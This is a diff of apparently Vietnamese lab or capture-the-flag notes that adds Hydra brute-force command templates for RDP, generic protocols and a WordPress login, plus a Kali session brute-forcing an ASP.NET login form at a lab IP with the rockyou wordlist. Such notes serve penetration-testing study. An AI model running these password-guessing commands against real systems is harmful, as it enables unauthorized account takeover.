@@ -8,6 +8,12 @@
 
 <img width="482" height="646" alt="image" src="https://github.com/user-attachments/assets/b9dc3cff-49d3-4ead-a8d3-5810acca33e2" />
 
+Yêu cầu 
+`hydra -P <wordlist> -v <ip> <protocol>` 	T
+`hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>` 	
+`hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`
+`hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.138.181 http-post-form "/Account/login.aspx:__VIEWSTATE=L6PhnOAYOX10Wv1GQ2lfq69aWRkCPC3PPBCdUyo8fXsLR9hKV4vetGeEXDoEMNGJJ3DXGBVYFKzKdEteQTbYGa2Lkwx5LgEbjpbnbuHXjGg%2BBrudqreMSwEF6d40JF%2Fjp8gbJ%2Fh2g29TXPCLNSzKhnixiBEjhwFUgwcm49pvPAT%2FfniguX&__EVENTVALIDATION=IsqZUVbBR05VkpVW0l8rIHJMSyJey2dLuxzAe8kRPA0zY9%2BBqMUlkseWwohgeCEePlls%2BBaIjk8pfNhFohPN5yJeLXX%2Bbq3s7%2FBIGc0Pnlw6kbWI33ohdhbJq7EySUSe992T%2BBmop0QQ5DaPgIxFDh5wDIVOribEQ1xYZUjn%2F2F06X%2FfxSdlyKn&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -f
